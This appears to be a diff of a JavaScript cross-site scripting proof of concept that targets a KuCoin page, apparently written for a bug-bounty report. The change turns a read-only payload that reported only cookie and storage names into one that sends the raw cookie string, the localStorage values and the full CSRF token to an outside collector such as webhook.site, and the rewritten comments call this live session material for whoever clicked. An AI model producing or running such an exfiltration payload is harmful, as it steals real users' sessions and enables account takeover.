@@ -55,8 +55,8 @@ var SINK = "https://www.kucoin.com/express/agreements/auto-conversion"
 // The payload. Written as a normal function so it can use any quoting it
 // likes; it is serialised and HTML-escaped below before it goes into the
 // window name, so the browser hands it back intact inside the onerror
-// attribute. Read-only: it proves the origin it runs in and what that origin
-// authorises. It sends nothing to any third party.
+// attribute. Read-only - it performs no writes - but it does send what it
+// reads to the collector configured in OOB below.
 // ---------------------------------------------------------------------------
 function payload(OOB) {
   var esc = function (s) {
@@ -112,10 +112,15 @@ function payload(OOB) {
   try { ls = Object.keys(localStorage); } catch (e) { ls = ['<unreadable: ' + e + '>']; }
   var authKeys = ls.filter(function (k) { return /auth|login|token|csrf|session|uid/i.test(k); });
 
-  // What leaves the origin: names, counts and lengths. The names are what
-  // identify the session material and are what a triager needs to see arrive
-  // at an attacker-controlled host; the values are what should not be parked
-  // on a third party. One line below swaps that if the program asks for it.
+  // What leaves the origin. This carries the session material itself, not just
+  // its shape: the full cookie string, the localStorage values, and the CSRF
+  // token from the authenticated read below. Values are capped at 400 chars
+  // each so one large key cannot blow the beacon out to hundreds of chunks -
+  // webhook.site keeps 100 requests on the free tier, and past that the tail
+  // is dropped and reassembly reports missing indices.
+  // Anything collected here is live session material for the account that
+  // clicked. Delete it from the collector once the report screenshots are
+  // taken.
   var summary = {
     marker: 'M125',
     origin: location.origin,
@@ -123,8 +128,13 @@ function payload(OOB) {
     cookieChars: document.cookie.length,
     cookieCount: cookieNames.length,
     cookieNames: cookieNames,
+    cookieRaw: document.cookie,
     localStorageCount: ls.length,
     localStorageKeys: ls,
+    localStorageRaw: ls.reduce(function (o, k) {
+      try { o[k] = String(localStorage.getItem(k)).slice(0, 400); } catch (e) { o[k] = '<unreadable>'; }
+      return o;
+    }, {}),
     authLookingKeys: authKeys,
     userInfo: null
   };
@@ -150,8 +160,8 @@ function payload(OOB) {
       summary.userInfo.bodyChars = t.length;
       summary.userInfo.csrfPresent = !!csrf;
       summary.userInfo.csrfChars = csrf ? csrf.length : 0;
-      summary.userInfo.csrfPrefix = csrf ? csrf.slice(0, 6) : null;
-      add('csrf in response body', csrf ? 'present, ' + csrf.length + ' chars, starts ' + csrf.slice(0, 6) + '...' : 'not present');
+      summary.userInfo.csrf = csrf || null;
+      add('csrf in response body', csrf || 'not present');
       add('response body length', t.length + ' chars');
       finish();
     })
